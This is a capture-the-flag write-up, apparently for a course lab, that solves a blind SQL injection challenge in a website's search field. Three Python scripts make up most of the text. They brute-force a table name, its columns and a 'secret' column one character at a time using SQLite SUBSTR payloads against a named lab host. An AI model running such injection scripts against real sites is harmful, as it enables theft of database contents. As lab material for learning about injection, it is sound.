# Challenge: Sometimes_we_are_just_temporarily_blind-v2 Writeup
## It is the same resolution as Sometimes_we_are_just_temporarily_blind Challenge
## I already done it with case sensitive :)
## Step 1: Discovering the Second Table Name

- **Vulnerability**: SQL Injection
  - _Eg, Determining the name of the second table in the database through SQL Injection._
- **Where**: Present in a website's search feature.
  - _Eg, A vulnerable input field in the website's search functionality._
- **Impact**: Discovery of the name of the second table.
  - _Eg, This could potentially expose sensitive information if the table contains confidential data._

- **NOTE**: The script iterates through possible characters to determine the name of the second table in the database.

### Steps to reproduce

1. Use the `get_table_name` function to iterate through characters.
2. Append each discovered character to construct the table name.
3. Repeat until the full name is determined.

```python
import requests
import string

def get_table_name(url, base_payload, table_position):
    char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
    table_name = ''
    position = 1
    while True:
        found_letter = False
        for char in char_set:
            payload = base_payload.format(table_position, position, char)
            response = requests.get(url + payload)
            if response.status_code == 200 and "Found 4 articles with search query" in response.text:
                table_name += char
                found_letter = True
                break
        if not found_letter:
            break
        position += 1
    return table_name

url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search="
base_payload = "' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {}), {}, 1) = '{}' -- "
table_position = 1
second_table_name = get_table_name(url, base_payload, table_position)
print(f"The name of the second table is: {second_table_name}")

```
### Step 2: Enumerating Column Names of the Second Table

- **Vulnerability**: SQL Injection
  - _Discovering column names of the identified table._
- **Where**: Same vulnerable search feature.
- **Impact**: Revealing the schema of the table, aiding in further exploitation.

### Steps to reproduce

1. Apply the `get_column_names` function with the identified table name.
2. Iterate over characters to find each column name.
3. Compile a list of column names.

```python
import requests
import string

def get_column_names(url, base_payload, table_name):
    column_names = []
    for column_index in range(10):
        column_name = ''
        position = 1
        while True:
            found_letter = False
            for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation:
                payload = base_payload.format(table_name, column_index, position, char)
                response = requests.get(url + payload)
                if response.status_code == 200 and "Found 4 articles with search query" in response.text:
                    column_name += char
                    found_letter = True
                    break
            if not found_letter:
                break
            position += 1
        if column_name:
            column_names.append(column_name)
        else:
            break
    return column_names

url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search="
base_payload = "' AND SUBSTR((SELECT name FROM pragma_table_info('{}') LIMIT 1 OFFSET {}), {}, 1) = '{}' -- "
table_name = "super_s_sof_secrets"
column_names = get_column_names(url, base_payload, table_name)
print(f"Column names in the table {table_name}: {column_names}")
```

# Step 3: Extracting Contents of the 'Secret' Column

- **Vulnerability**: SQL Injection
  - _Retrieving data from the 'secret' column of the identified table._
- **Where**: Same vulnerable search feature.
- **Impact**: Accessing sensitive data within the table, potentially exposing confidential information.

### Steps to reproduce

1. Use the `get_secret_column_contents` function with the target table and column.
2. Iterate through characters at each position to build the contents of the 'secret' column.
3. Output the extracted data.

```python
import requests
import string

def get_secret_column_contents(url, table_name, column_name, max_rows=10):
    for row_index in range(max_rows):
        secret_data = ''
        position = 1
        while True:
            found_character = False
            for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation:
                payload = f"' AND (SELECT SUBSTR({column_name}, {position}, 1) FROM {table_name} LIMIT 1 OFFSET {row_index}) = '{char}' -- "
                full_url = url + payload
                response = requests.get(full_url)
                if response.status_code == 200 and "Found 0 articles with search query" not in response.text:
                    secret_data += char
                    found_character = True
                    break
            if not found_character:
                break
            position += 1
        if secret_data:
            print(f"Row {row_index + 1}, {column_name}: {secret_data}")
        else:
            break

url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search="
table_name = "super_s_sof_secrets"
column_name = "secret"
get_secret_column_contents(url, table_name, column_name)


